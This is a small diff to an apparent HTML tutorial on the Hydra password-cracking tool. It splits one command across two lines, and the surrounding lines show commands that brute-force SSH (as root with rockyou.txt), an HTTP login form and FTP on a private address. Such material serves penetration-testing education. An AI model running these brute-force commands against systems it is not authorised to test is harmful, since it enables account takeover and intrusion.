@@ -317,7 +317,8 @@ sudo apt install hydra</code>
     <code>hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10</code>
     
     <p>Brute-force an HTTP login form:</p>
-    <code>hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"</code>
+    <code>hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form</code>
+    <code>"/login.php:user=^USER^&pass=^PASS^:F=incorrect"</code>
     
     <p>Brute-force FTP service with multiple usernames and passwords:</p>
     <code>hydra -L users.txt -P passwords.txt ftp://192.168.1.10</code>
